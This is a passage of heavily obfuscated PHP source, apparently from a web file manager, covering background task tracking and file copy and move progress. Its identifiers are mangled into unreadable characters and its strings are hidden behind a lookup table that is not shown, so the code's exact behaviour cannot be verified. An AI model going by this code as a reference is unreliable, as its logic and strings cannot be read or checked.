$õ’åÃÇ× >= floatval($³ıáŞá[$àü¤Ğ[1737]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $¾¾¸ßèÈ =& $_SERVER[£ğ°ÖØø]; static $ŒÅ¿ªÚ• = 0; $ššÇ¬¯ï = 300; if (!$ŒÅ¿ªÚ•) { $ŒÅ¿ªÚ• = time(); } if (time() - $ŒÅ¿ªÚ• < $ššÇ¬¯ï) { return; } $ŒÅ¿ªÚ• = time(); $¥¿Ûçâ¢ = Model($¾¾¸ßèÈ[586])->db($¾¾¸ßèÈ[12]); if ($¥¿Ûçâ¢) { $¥¿Ûçâ¢->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($¾¾¸ßèÈ[1738], $¾¾¸ßèÈ[1739]); die; } } public static function taskRun($í´ŞîÑœ) { $Æ‹‰”ü– =& $_SERVER[£ğ°ÖØø]; self::log($Æ‹‰”ü–[1740] . $í´ŞîÑœ[$Æ‹‰”ü–[484]] . $Æ‹‰”ü–[1741] . $í´ŞîÑœ[$Æ‹‰”ü–[32]] . $Æ‹‰”ü–[1742] . $í´ŞîÑœ[$Æ‹‰”ü–[1743]]); Model($Æ‹‰”ü–[1724])->run($í´ŞîÑœ[$Æ‹‰”ü–[484]]); $Òäô­Ÿ‹ = timeFloat(); $«ß»ü¥ = $Æ‹‰”ü–[12]; switch ($í´ŞîÑœ[$Æ‹‰”ü–[33]]) { case $Æ‹‰”ü–[383]: $ÔñíÍûù = url_request($í´ŞîÑœ[$Æ‹‰”ü–[1743]], $Æ‹‰”ü–[261], !1, !1, !1, !1, 10); if ($ÔñíÍûù[$Æ‹‰”ü–[814]]) { $«ß»ü¥ = strlen($ÔñíÍûù[$Æ‹‰”ü–[1270]]); } break; case $Æ‹‰”ü–[260]: $«ß»ü¥ = Hook::apply($í´ŞîÑœ[$Æ‹‰”ü–[1743]]); default: break; } Model($Æ‹‰”ü–[1744])->add(array($Æ‹‰”ü–[1745] => $Æ‹‰”ü–[12], $Æ‹‰”ü–[1746] => $Æ‹‰”ü–[228], $Æ‹‰”ü–[33] => $Æ‹‰”ü–[1747] . $í´ŞîÑœ[$Æ‹‰”ü–[484]], $Æ‹‰”ü–[1748] => json_encode(array($Æ‹‰”ü–[32] => $í´ŞîÑœ[$Æ‹‰”ü–[32]], $Æ‹‰”ü–[1749] => timeFloat() - $Òäô­Ÿ‹, $Æ‹‰”ü–[369] => $«ß»ü¥)))); $Ö×ç×¡ = $«ß»ü¥ ? $Æ‹‰”ü–[1750] . $«ß»ü¥ : $Æ‹‰”ü–[12]; self::log($Æ‹‰”ü–[1751] . $í´ŞîÑœ[$Æ‹‰”ü–[484]] . $Æ‹‰”ü–[178] . $Ö×ç×¡); return !0; } public static function valueGet($´ÓÁªƒ) { $¾à°œó =& $_SERVER[£ğ°ÖØø]; $ÀŞÉò„ = $¾à°œó[1752]; $ÌÆ†ñ = Model($¾à°œó[517])->get($´ÓÁªƒ, $ÀŞÉò„); if (is_null($ÌÆ†ñ)) { Model($¾à°œó[517])->set($¾à°œó[814], $¾à°œó[91], $ÀŞÉò„); Model($¾à°œó[517])->set($¾à°œó[1705], $¾à°œó[228], $ÀŞÉò„); $ÌÆ†ñ = Model($¾à°œó[517])->get($´ÓÁªƒ, $ÀŞÉò„); } return $ÌÆ†ñ; } private static function valueSet($ÆÏ©øíÃ, $ÂààŠ¿î = false) { $»ù¤ÔÜ÷ =& $_SERVER[£ğ°ÖØø]; $úÈéÛ‚ = $»ù¤ÔÜ÷[1753]; CacheLock::lock($úÈéÛ‚); $Ñ¬‘Õ¼À = Model($»ù¤ÔÜ÷[517])->set($ÆÏ©øíÃ, $ÂààŠ¿î, $»ù¤ÔÜ÷[1752]); CacheLock::unlock($úÈéÛ‚); return $Ñ¬‘Õ¼À; } protected static function log($­™ëã¸À) { write_log($­™ëã¸À, $_SERVER[£ğ°ÖØø][1739]); } private static function cacheClear() { $¹–†î˜ =& $_SERVER[£ğ°ÖØø]; Cache::clearMemory(Model($¹–†î˜[517])->cacheKey($¹–†î˜[1752])); Cache::clearMemory(Model($¹–†î˜[517])->cacheKey($¹–†î˜[1754])); Model($¹–†î˜[1724])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\164\157\x70"; const STATYS_RUNNING = "\x72\x75\156\x6e\x69\156\147"; const STATYS_KILL = "\153\151\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ğ…¤¾õÏ, $†„õĞ = '', $æ÷ş•ü¿ = 0, $ÑÃâ¸Ë² = '') { $ãÓ¦îö£ =& $_SERVER[£ğ°ÖØø]; if (self::get($ğ…¤¾õÏ)) { return; } $this->task = array($ãÓ¦îö£[484] => $ğ…¤¾õÏ, $ãÓ¦îö£[1755] => USER_ID, $ãÓ¦îö£[1642] => $ÑÃâ¸Ë², $ãÓ¦îö£[535] => $ãÓ¦îö£[12], $ãÓ¦îö£[33] => $†„õĞ, $ãÓ¦îö£[1126] => $ãÓ¦îö£[12], $ãÓ¦îö£[1124] => $æ÷ş•ü¿, $ãÓ¦îö£[1756] => 0, $ãÓ¦îö£[1757] => 0, $ãÓ¦îö£[1758] => 0, $ãÓ¦îö£[1759] => timeFloat(), $ãÓ¦îö£[1760] => 0, $ãÓ¦îö£[1761] => 0, $ãÓ¦îö£[1762] => 0, $ãÓ¦îö£[1763] => 0, $ãÓ¦îö£[814] => $ãÓ¦îö£[1705]); $GLOBALS[$ãÓ¦îö£[1764]] = 1; Hook::bind($ãÓ¦îö£[1709], array($this, $ãÓ¦îö£[1765])); Hook::bind($ãÓ¦îö£[1766], array($this, $ãÓ¦îö£[1767])); $this->startAfter(); Hook::trigger($ãÓ¦îö£[1768], $this->task); $this->task[$ãÓ¦îö£[1761]] = timeFloat(); } public function end($ôúĞó‹ = '') { $çºŠÊ¤× =& $_SERVER[£ğ°ÖØø]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$çºŠÊ¤×[1761]]) { self::valueSet($this->task[$çºŠÊ¤×[484]], !1); } $this->isEnd = !0; if ($ôúĞó‹) { $this->task[$çºŠÊ¤×[535]] = $ôúĞó‹; } self::log($çºŠÊ¤×[1769] . $this->task[$çºŠÊ¤×[484]] . $çºŠÊ¤×[1770] . sprintf($çºŠÊ¤×[914], timeFloat() - $this->task[$çºŠÊ¤×[1759]]) . $çºŠÊ¤×[1771]); Hook::unbind($çºŠÊ¤×[1709], array($this, $çºŠÊ¤×[1765])); Hook::unbind($çºŠÊ¤×[1766], array($this, $çºŠÊ¤×[1767])); $this->endAfter(); $·…£†ğ‡ = $this->task; $this->task = !1; Hook::trigger($çºŠÊ¤×[1772], $·…£†ğ‡); } public function update($²îç»æÒ = 0, $à¨Øƒ¤ = false) { $ ıÆŸÄ¬ =& $_SERVER[£ğ°ÖØø]; $Ùš¬¶á =& $this->task; if (!$Ùš¬¶á) { return; } $Ùš¬¶á[$ ıÆŸÄ¬[1756]] += $²îç»æÒ; $Ùš¬¶á[$ ıÆŸÄ¬[1760]] = timeFloat(); if ($Ùš¬¶á[$ ıÆŸÄ¬[1124]]) { if ($Ùš¬¶á[$ ıÆŸÄ¬[1124]] < $Ùš¬¶á[$ ıÆŸÄ¬[1756]]) { $Ùš¬¶á[$ ıÆŸÄ¬[1124]] = $Ùš¬¶á[$ ıÆŸÄ¬[1756]]; } $¢İ¶¦Ú¦ = timeFloat() - $Ùš¬¶á[$ ıÆŸÄ¬[1759]] - $Ùš¬¶á[$ ıÆŸÄ¬[1762]]; if ($¢İ¶¦Ú¦ <= 0) { $¢İ¶¦Ú¦ = 0.001; } $Ùš¬¶á[$ ıÆŸÄ¬[1757]] = $Ùš¬¶á[$ ıÆŸÄ¬[1756]] / $Ùš¬¶á[$ ıÆŸÄ¬[1124]]; $Ùš¬¶á[$ ıÆŸÄ¬[1758]] = $Ùš¬¶á[$ ıÆŸÄ¬[1756]] / $¢İ¶¦Ú¦; if ($Ùš¬¶á[$ ıÆŸÄ¬[1757]] > 0) { $Ùš¬¶á[$ ıÆŸÄ¬[1763]] = $¢İ¶¦Ú¦ * (1 - $Ùš¬¶á[$ ıÆŸÄ¬[1757]]) / $Ùš¬¶á[$ ıÆŸÄ¬[1757]]; } $Ùš¬¶á[$ ıÆŸÄ¬[1763]] = $Ùš¬¶á[$ ıÆŸÄ¬[1763]] <= 0 ? 0 : $Ùš¬¶á[$ ıÆŸÄ¬[1763]]; } $this->updateAfter(); $’ıáÀ™¢ = 0.2; if (timeFloat() - $Ùš¬¶á[$ ıÆŸÄ¬[1761]] < $’ıáÀ™¢ && !$à¨Øƒ¤) { return; } $É»³şÇç = self::get($Ùš¬¶á[$ ıÆŸÄ¬[484]]); $å…Æ„Ë¡ = $É»³şÇç[$ ıÆŸÄ¬[814]]; if ($å…Æ„Ë¡ == self::STATYS_KILL) { $¾´¸İµÚ = array($ ıÆŸÄ¬[1773] => LNG($ ıÆŸÄ¬[1774]), $ ıÆŸÄ¬[1280] => !1); Cache::set($ ıÆŸÄ¬[1775] . $this->task[$ ıÆŸÄ¬[484]], $¾´¸İµÚ, 30); $this->onKill(); $this->end(); die; } else { if ($å…Æ„Ë¡ == self::STATYS_STOP) { $›÷™‡­® = 2; $É»³şÇç[$ ıÆŸÄ¬[1762]] += $›÷™‡­®; self::valueSet($Ùš¬¶á[$ ıÆŸÄ¬[484]], $É»³şÇç); sleep($›÷™‡­®); $this->update(); return; } } $Ùš¬¶á[$ ıÆŸÄ¬[814]] = $å…Æ„Ë¡ ? $å…Æ„Ë¡ : $Ùš¬¶á[$ ıÆŸÄ¬[814]]; $Ùš¬¶á[$ ıÆŸÄ¬[1762]] = $É»³şÇç[$ ıÆŸÄ¬[1762]] ? $É»³şÇç[$ ıÆŸÄ¬[1762]] : 0; $Ùš¬¶á[$ ıÆŸÄ¬[1761]] = timeFloat(); Hook::trigger($ ıÆŸÄ¬[1776], $Ùš¬¶á); self::valueSet($Ùš¬¶á[$ ıÆŸÄ¬[484]], $Ùš¬¶á); } public function onKillSet($¨ ·îß, $ï¾¥Û»– = array()) { $this->onKillCall = array($¨ ·îß, $ï¾¥Û»–); } public function onKill() { $‰ÄÓ´† =& $_SERVER[£ğ°ÖØø]; self::log($‰ÄÓ´†[1769] . $this->task[$‰ÄÓ´†[484]] . $‰ÄÓ´†[1777]); Hook::trigger($‰ÄÓ´†[1778], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Â±•şÏœ) { $öãú³›ª =& $_SERVER[£ğ°ÖØø]; Cache::set($öãú³›ª[1775] . $this->task[$öãú³›ª[484]], $Â±•şÏœ, 60); return $Â±•şÏœ; } public static function get($¨’ìì‰É) { $Âñ³¢¨ô =& $_SERVER[£ğ°ÖØø]; $°æ·­— = self::valueGet($¨’ìì‰É); if (is_array($°æ·­—) && $°æ·­—[$Âñ³¢¨ô[1779]]) { $£´æü´† = ActionApply($°æ·­—[$Âñ³¢¨ô[1779]], array($°æ·­—)); $°æ·­— = is_array($£´æü´†) ? $£´æü´† : $°æ·­—; } return $°æ·­—; } public static function listData() { $½ë€ÀÍ¶ = self::valueGet(); return array_sort_by($½ë€ÀÍ¶, $_SERVER[£ğ°ÖØø][1759], !0); } public static function kill($ÑÈù›…) { return self::changeStatus($ÑÈù›…, self::STATYS_KILL); } public static function stop($õ¦òÌ¦©) { return self::changeStatus($õ¦òÌ¦©, self::STATYS_STOP); } public static function restart($‹í…ïÈÙ) { return self::changeStatus($‹í…ïÈÙ, self::STATYS_RUNNING); } public static function killAll() { $…€ªƒ² =& $_SERVER[£ğ°ÖØø]; $ÛàÛš¿» = self::listData(); foreach ($ÛàÛš¿» as $Šïø‚ù±) { self::kill($Šïø‚ù±[$…€ªƒ²[484]]); } sleep(2); foreach ($ÛàÛš¿» as $Šïø‚ù±) { self::valueSet($Šïø‚ù±[$…€ªƒ²[484]], !1); } } private static function changeStatus($Ñ³Ò½, $ºğ¤ƒä) { $¿½‚ =& $_SERVER[£ğ°ÖØø]; $¼İÈ›ç = self::valueGet($Ñ³Ò½); if (!$¼İÈ›ç) { return !1; } $¼İÈ›ç[$¿½‚[814]] = $ºğ¤ƒä; self::valueSet($Ñ³Ò½, $¼İÈ›ç); self::log($¿½‚[1780] . $¼İÈ›ç[$¿½‚[484]] . $¿½‚[1781] . $ºğ¤ƒä); return !0; } public static function valueGet($©É§–à¦ = false) { $ÇìÍå‹« =& $_SERVER[£ğ°ÖØø]; if ($©É§–à¦) { $÷òö¸„æ = Model($ÇìÍå‹«[529])->where(array($ÇìÍå‹«[97] => $©É§–à¦, $ÇìÍå‹«[33] => $ÇìÍå‹«[1133]))->find(); return $÷òö¸„æ ? json_decode($÷òö¸„æ[$ÇìÍå‹«[459]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ —Àµ‰« = false) { $¢¸£Àˆ¹ =& $_SERVER[£ğ°ÖØø]; $Â‰ùÛ×ó = array($¢¸£Àˆ¹[33] => $¢¸£Àˆ¹[1133]); if ($ —Àµ‰«) { $Â‰ùÛ×ó[$¢¸£Àˆ¹[1755]] = $ —Àµ‰«; } $ŸÒ¸ãÃ¤ = Model($¢¸£Àˆ¹[529])->where($Â‰ùÛ×ó)->select(); $ŸÒ¸ãÃ¤ = $ŸÒ¸ãÃ¤ ? $ŸÒ¸ãÃ¤ : array(); foreach ($ŸÒ¸ãÃ¤ as $‰Ñ¨Å…Á => $ ›ËËÚ’) { $ŸÒ¸ãÃ¤[$‰Ñ¨Å…Á] = json_decode($ ›ËËÚ’[$¢¸£Àˆ¹[459]], !0); } return $ŸÒ¸ãÃ¤; } public static function valueSet($Éˆú×ŞÈ, $ƒ¨ö¢²) { $İß‚íÖÓ =& $_SERVER[£ğ°ÖØø]; if (!$ƒ¨ö¢²) { return Model($İß‚íÖÓ[529])->where(array($İß‚íÖÓ[97] => $Éˆú×ŞÈ, $İß‚íÖÓ[33] => $İß‚íÖÓ[1133]))->delete(); } $°œÔÊû = json_encode($ƒ¨ö¢²); if (!$°œÔÊû) { ob_start(); var_dump($ƒ¨ö¢²); $ÂåÌŞô = ob_get_clean(); self::log($İß‚íÖÓ[1782] . json_encode_force($ÂåÌŞô)); } if (!$Éˆú×ŞÈ || !$ƒ¨ö¢²[$İß‚íÖÓ[484]]) { return !1; } $Î…ÄÆú° = array($İß‚íÖÓ[33] => $İß‚íÖÓ[1133], $İß‚íÖÓ[1755] => USER_ID, $İß‚íÖÓ[97] => $Éˆú×ŞÈ, $İß‚íÖÓ[459] => $°œÔÊû); $ãè©ìÑ× = $İß‚íÖÓ[1783]; CacheLock::lock($ãè©ìÑ×); Model($İß‚íÖÓ[529])->add($Î…ÄÆú°, array(), !0); CacheLock::unlock($ãè©ìÑ×); } public static function log($Š´ÙĞôÍ) { if (!GLOBAL_DEBUG) { return; } write_log($Š´ÙĞôÍ, $_SERVER[£ğ°ÖØø][1784]); } } class TaskFileTransfer extends Task { protected function startAfter() { $İ•àÓ¥„ =& $_SERVER[£ğ°ÖØø]; $ÆÜ¡„ºŞ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($İ•àÓ¥„[1785], array($this, $İ•àÓ¥„[1786])); Hook::bind($İ•àÓ¥„[1291], array($this, $İ•àÓ¥„[1787])); Hook::bind($İ•àÓ¥„[1788], array($this, $İ•àÓ¥„[1789])); Hook::bind($İ•àÓ¥„[677], array($this, $İ•àÓ¥„[1790])); Hook::bind($İ•àÓ¥„[678], array($this, $İ•àÓ¥„[1791])); Hook::bind($İ•àÓ¥„[684], array($this, $İ•àÓ¥„[1792])); Hook::bind($İ•àÓ¥„[685], array($this, $İ•àÓ¥„[1793])); Hook::bind($İ•àÓ¥„[680], array($this, $İ•àÓ¥„[1794])); Hook::bind($İ•àÓ¥„[682], array($this, $İ•àÓ¥„[1795])); Hook::bind($İ•àÓ¥„[646], array($this, $İ•àÓ¥„[1796])); Hook::bind($İ•àÓ¥„[643], array($this, $İ•àÓ¥„[1796])); Hook::bind($İ•àÓ¥„[648], array($this, $İ•àÓ¥„[1796])); Hook::bind($İ•àÓ¥„[650], array($this, $İ•àÓ¥„[1796])); Hook::bind($İ•àÓ¥„[652], array($this, $İ•àÓ¥„[1796])); Hook::bind($İ•àÓ¥„[1797], array($this, $İ•àÓ¥„[1798])); Hook::bind($İ•àÓ¥„[668], array($this, $İ•àÓ¥„[1799])); $this->sourceModelCopyFlag = !1; Hook::bind($İ•àÓ¥„[1800], array($this, $İ•àÓ¥„[1801])); Hook::bind($İ•àÓ¥„[1802], array($this, $İ•àÓ¥„[1803])); Hook::bind($İ•àÓ¥„[1804], array($this, $İ•àÓ¥„[1805])); $ÆÜ¡„ºŞ[$İ•àÓ¥„[1806]] = LNG($İ•àÓ¥„[1807]); $ÆÜ¡„ºŞ[$İ•àÓ¥„[1808]] = 0; $ÆÜ¡„ºŞ[$İ•àÓ¥„[1809]] = 0; $ÆÜ¡„ºŞ[$İ•àÓ¥„[1126]] = $İ•àÓ¥„[12]; $ÆÜ¡„ºŞ[$İ•àÓ¥„[1810]] = $İ•àÓ¥„[12]; $ÆÜ¡„ºŞ[$İ•àÓ¥„[1811]] = 0; $ÆÜ¡„ºŞ[$İ•àÓ¥„[1812]] = 0; $ÆÜ¡„ºŞ[$İ•àÓ¥„[1813]] = 0; if (!$ÆÜ¡„ºŞ[$İ•àÓ¥„[1642]]) { $ÆÜ¡„ºŞ[$İ•àÓ¥„[1642]] = LNG($İ•àÓ¥„[1814]); } } protected function endAfter() { $®ü—ëÂ× =& $_SERVER[£ğ°ÖØø]; Hook::unbind($®ü—ëÂ×[1785], array($this, $®ü—ëÂ×[1786])); Hook::unbind($®ü—ëÂ×[1291], array($this, $®ü—ëÂ×[1787])); Hook::unbind($®ü—ëÂ×[1788], array($this, $®ü—ëÂ×[1789])); Hook::unbind($®ü—ëÂ×[677], array($this, $®ü—ëÂ×[1790])); Hook::unbind($®ü—ëÂ×[678], array($this, $®ü—ëÂ×[1791])); Hook::unbind($®ü—ëÂ×[684], array($this, $®ü—ëÂ×[1792])); Hook::unbind($®ü—ëÂ×[685], array($this, $®ü—ëÂ×[1793])); Hook::unbind($®ü—ëÂ×[680], array($this, $®ü—ëÂ×[1794])); Hook::unbind($®ü—ëÂ×[682], array($this, $®ü—ëÂ×[1795])); Hook::unbind($®ü—ëÂ×[646], array($this, $®ü—ëÂ×[1796])); Hook::unbind($®ü—ëÂ×[643], array($this, $®ü—ëÂ×[1796])); Hook::unbind($®ü—ëÂ×[648], array($this, $®ü—ëÂ×[1796])); Hook::unbind($®ü—ëÂ×[650], array($this, $®ü—ëÂ×[1796])); Hook::unbind($®ü—ëÂ×[652], array($this, $®ü—ëÂ×[1796])); Hook::unbind($®ü—ëÂ×[1797], array($this, $®ü—ëÂ×[1798])); Hook::unbind($®ü—ëÂ×[668], array($this, $®ü—ëÂ×[1799])); Hook::unbind($®ü—ëÂ×[1800], array($this, $®ü—ëÂ×[1801])); Hook::unbind($®ü—ëÂ×[1802], array($this, $®ü—ëÂ×[1803])); Hook::unbind($®ü—ëÂ×[1804], array($this, $®ü—ëÂ×[1805])); } public function copyMoveStart($‰ãİÕÒê, $€íù³öÜ, $í¹šâşº, $±ºÔàÔ¾) { $üÆÁ»âà =& $_SERVER[£ğ°ÖØø]; self::log($üÆÁ»âà[1815] . $€íù³öÜ . $üÆÁ»âà[73] . $±ºÔàÔ¾); $øœÂ„¯ = rtrim(TEMP_FILES, $üÆÁ»âà[8]); if (substr($€íù³öÜ, 0, strlen($øœÂ„¯)) == $øœÂ„¯) { return; } if (substr($±ºÔàÔ¾, 0, strlen($øœÂ„¯)) == $øœÂ„¯) { return; } $ãäİ¦‚× =& $this->task; $ãäİ¦‚×[$üÆÁ»âà[1816]] = KodIO::transferType($‰ãİÕÒê, $í¹šâşº); $this->update(); } public function updateAfter() { $êÆø²‰Å =& $_SERVER[£ğ°ÖØø]; $ï„üŒµ¿ =& $this->task; if (!$ï„üŒµ¿[$êÆø²‰Å[827]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ï„üŒµ¿[$êÆø²‰Å[1816]] == $êÆø²‰Å[1384]) { return; } self::updateTask($ï„üŒµ¿); } private static function updateTask(&$…¦Ä’ªÆ) { $¾‚Á«Š =& $_SERVER[£ğ°ÖØø]; if ($…¦Ä’ªÆ[$¾‚Á«Š[1816]] == $¾‚Á«Š[1262] || $…¦Ä’ªÆ[$¾‚Á«Š[1816]] == $¾‚Á«Š[110]) { if ($…¦Ä’ªÆ[$¾‚Á«Š[1810]]) { $…¦Ä’ªÆ[$¾‚Á«Š[1813]] = $…¦Ä’ªÆ[$¾‚Á«Š[1812]] + $…¦Ä’ªÆ[$¾‚Á«Š[1809]]; } } else { if ($…¦Ä’ªÆ[$¾‚Á«Š[1816]] == $¾‚Á«Š[1385]) { if ($…¦Ä’ªÆ[$¾‚Á«Š[1810]] == $¾‚Á«Š[1262]) { $…¦Ä’ªÆ[$¾‚Á«Š[1813]] = $…¦Ä’ªÆ[$¾‚Á«Š[1812]] + $…¦Ä’ªÆ[$¾‚Á«Š[1809]] * 0.5; } else { if ($…¦Ä’ªÆ[$¾‚Á«Š[1810]] == $¾‚Á«Š[110]) { $…¦Ä’ªÆ[$¾‚Á«Š[1813]] = $…¦Ä’ªÆ[$¾‚Á«Š[1812]] + $…¦Ä’ªÆ[$¾‚Á«Š[1808]] * 0.5 + $…¦Ä’ªÆ[$¾‚Á«Š[1809]] * 0.5; } } } } $…¦Ä’ªÆ[$¾‚Á«Š[1757]] = $…¦Ä’ªÆ[$¾‚Á«Š[1813]] / $…¦Ä’ªÆ[$¾‚Á«Š[827]]; if ($…¦Ä’ªÆ[$¾‚Á«Š[1757]] > 0) { $·¦‘£»û = timeFloat() - $…¦Ä’ªÆ[$¾‚Á«Š[1759]] - $…¦Ä’ªÆ[$¾‚Á«Š[1762]]; $…¦Ä’ªÆ[$¾‚Á«Š[1763]] = $·¦‘£»û * (1 - $…¦Ä’ªÆ[$¾‚Á«Š[1757]]) / $…¦Ä’ªÆ[$¾‚Á«Š[1757]]; } } public function addPath($Î×«) { $•î½Úğ‚ =& $_SERVER[£ğ°ÖØø]; if (!$Î×«) { return; } $ñş’„ÒŸ =& $this->task; $•Ñ•‘•¥ = IO::infoWithChildren($Î×«); $ñğ©Ûâ¬ = $ñş’„ÒŸ[$•î½Úğ‚[1817]] ? $ñş’„ÒŸ[$•î½Úğ‚[1817]][$•î½Úğ‚[1818]] : 0; $ñş’„ÒŸ[$•î½Úğ‚[1817]] = array($•î½Úğ‚[1818] => $ñğ©Ûâ¬ + 1, $•î½Úğ‚[503] => $•Ñ•‘•¥[$•î½Úğ‚[32]], $•î½Úğ‚[87] => $•Ñ•‘•¥[$•î½Úğ‚[87]], $•î½Úğ‚[591] => $•Ñ•‘•¥[$•î½Úğ‚[591]] ? $•Ñ•‘•¥[$•î½Úğ‚[591]] : $•Ñ•‘•¥[$•î½Úğ‚[87]]); if ($•Ñ•‘•¥[$•î½Úğ‚[33]] == $•î½Úğ‚[230]) { $ñş’„ÒŸ[$•î½Úğ‚[1124]] += 1; } else { $ñş’„ÒŸ[$•î½Úğ‚[1124]] += $•Ñ•‘•¥[$•î½Úğ‚[82]][$•î½Úğ‚[80]]; if ($•Ñ•‘•¥[$•î½Úğ‚[193]]) { $ñş’„ÒŸ[$•î½Úğ‚[1124]] += $•Ñ•‘•¥[$•î½Úğ‚[82]][$•î½Úğ‚[81]] + 1; } } $ñş’„ÒŸ[$•î½Úğ‚[827]] += $•Ñ•‘•¥[$•î½Úğ‚[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($¢Æµ“Íµ) { } public function sourceAddHashEnd($¬ùô‡ó) { } public function sourceAddFileStart($±©†Õ¨È) { $›¿‘Äå› =& $_SERVER[£ğ°ÖØø]; $›Ã®¸ø˜ =& $this->task; $›Ã®¸ø˜[$›¿‘Äå›[1808]] = $±©†Õ¨È[$›¿‘Äå›[79]]; $›Ã®¸ø˜[$›¿‘Äå›[1806]] = $±©†Õ¨È[$›¿‘Äå›[32]]; $›Ã®¸ø˜[$›¿‘Äå›[1126]] = $±©†Õ¨È[$›¿‘Äå›[32]]; $›Ã®¸ø˜[$›¿‘Äå›[1819]] = $±©†Õ¨È[$›¿‘Äå›[87]]; $this->update(); } public function sourceAddFileEnd($õ€¹Ì¦é) { $Ä¥Ë®±à =& $_SERVER[£ğ°ÖØø]; $Ñş­æë¿ =& $this->task; $Ñş­æë¿[$Ä¥Ë®±à[1813]] += $õ€¹Ì¦é[$Ä¥Ë®±à[79]]; $Ñş­æë¿[$Ä¥Ë®±à[1819]] = $õ€¹Ì¦é[$Ä¥Ë®±à[87]]; $this->update(1); } public function copyFileStart($òòúº², $¤ã‘†–, $ìş‘ø´², $ŠµòÛß¿, $ÔßÁËá, $Öà¹÷») { $®ĞÕŒõñ =& $_SERVER[£ğ°ÖØø]; $€ÍÍç©û = $ÔßÁËá; if ($€ÍÍç©û == $GLOBALS[$®ĞÕŒõñ[1820]]) { $€ÍÍç©û = $GLOBALS[$®ĞÕŒõñ[1821]]; } $GLOBALS[$®ĞÕŒõñ[1821]] = $ÔßÁËá; $GLOBALS[$®ĞÕŒõñ[1820]] = $Öà¹÷»; $¦íº¡¿‚ =& $this->task; $¦íº¡¿‚[$®ĞÕŒõñ[1806]] = $€ÍÍç©û; $¦íº¡¿‚[$®ĞÕŒõñ[1808]] = (int) $òòúº²->size($¤ã‘†–); $¦íº¡¿‚[$®ĞÕŒõñ[1809]] = 0; $¦íº¡¿‚[$®ĞÕŒõñ[1126]] = $®ĞÕŒõñ[12]; $¦íº¡¿‚[$®ĞÕŒõñ[1810]] = $®ĞÕŒõñ[12]; $¦íº¡¿‚[$®ĞÕŒõñ[1811]] = 0; $Á¢ÊÂ‘• = $¦íº¡¿‚[$®ĞÕŒõñ[1808]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($¦íº¡¿‚[$®ĞÕŒõñ[484]] . $®ĞÕŒõñ[1822]); if ($Á¢ÊÂ‘• && file_exists(get_path_father($ŠµòÛß¿))) { Cache::set($¦íº¡¿‚[$®ĞÕŒõñ[484]] . $®ĞÕŒõñ[1822], $ŠµòÛß¿); $¦íº¡¿‚[$®ĞÕŒõñ[1779]] = array($®ĞÕŒõñ[1823], $®ĞÕŒõñ[1824]); } $this->update(0, $Á¢ÊÂ‘•); } public static function updateCopyLocalFileSize($•¦ˆï¿) { $›æ™¸¬Ú =& $_SERVER[£ğ°ÖØø]; $„¹ÍÒï¹ = Cache::get($•¦ˆï¿[$›æ™¸¬Ú[484]] . $›æ™¸¬Ú[1822]); if (!$„¹ÍÒï¹ || !file_exists($„¹ÍÒï¹)) { return $•¦ˆï¿; } $•¦ˆï¿[$›æ™¸¬Ú[1809]] = @filesize($„¹ÍÒï¹); $•¦ˆï¿[$›æ™¸¬Ú[1813]] += $•¦ˆï¿[$›æ™¸¬Ú[1809]]; self::updateTask($•¦ˆï¿); return $•¦ˆï¿; } public function copyFileEnd($±©æ»¶, $ÅØÊÌ™ü, $¢¼ø˜Šó, $Ö¥Éö²¡, $µØ­ĞŸ—, $åÚ×¬²Ğ) { $ªîùå„À =& $_SERVER[£ğ°ÖØø]; $…Ò÷ï„ç =& $this->task; $…Ò÷ï„ç[$ªîùå„À[1809]] = $…Ò÷ï„ç[$ªîùå„À[1808]]; $…Ò÷ï„ç[$ªîùå„À[1810]] = $ªîùå„À[12]; unset($…Ò÷ï„ç[$ªîùå„À[1779]]); if ($µØ­ĞŸ— == $…Ò÷ï„ç[$ªîùå„À[1806]]) { $…Ò÷ï„ç[$ªîùå„À[1812]] += $…Ò÷ï„ç[$ªîùå„À[1808]]; $…Ò÷ï„ç[$ªîùå„À[1813]] = $…Ò÷ï„ç[$ªîùå„À[1812]]; $åêí€Äú = 1; if (isset($…Ò÷ï„ç[$ªîùå„À[1819]]) && $…Ò÷ï„ç[$ªîùå„À[1819]] == $ÅØÊÌ™ü) { $åêí€Äú = 0; } $this->update($åêí€Äú); } else { $this->update(); $…Ò÷ï„ç[$ªîùå„À[1809]] = 0; } Cache::remove($…Ò÷ï„ç[$ªîùå„À[484]] . $ªîùå„À[1822]); self::log($ªîùå„À[1825] . $ÅØÊÌ™ü . $ªîùå„À[73] . $Ö¥Éö²¡ . $ªîùå„À[262] . $µØ­ĞŸ— . $ªîùå„À[1826] . $…Ò÷ï„ç[$ªîùå„À[1806]]); } public function updateFileEnd($®öĞ¿Ùù, $Úüßú—¤) { $×Üï€´ã =& $_SERVER[£ğ°ÖØø]; $à€‘ =& $this->task; $à€‘[$×Üï€´ã[1806]] = $®öĞ¿Ùù; $à€‘[$×Üï€´ã[1808]] = $Úüßú—¤; $à€‘[$×Üï€´ã[1812]] += $Úüßú—¤; $à€‘[$×Üï€´ã[1813]] = $à€‘[$×Üï€´ã[1812]]; $this->update(1); self::log($×Üï€´ã[1827] . $®öĞ¿Ùù); } public function sourceModelCopy($ª×«¦†Ğ) { $–´¨×Öâ =& $_SERVER[£ğ°ÖØø]; $„ëˆÕä¶ = $ª×«¦†Ğ[0]; $¼ıõìÙ = $ª×«¦†Ğ[1]; $œ¥öÕí£ =& $this->task; $this->sourceModelCopyFlag = !0; $Ä¤¾‡—« = 0; switch ($„ëˆÕä¶) { case $–´¨×Öâ[644]: $Ä¤¾‡—« = 1; break; case $–´¨×Öâ[647]: 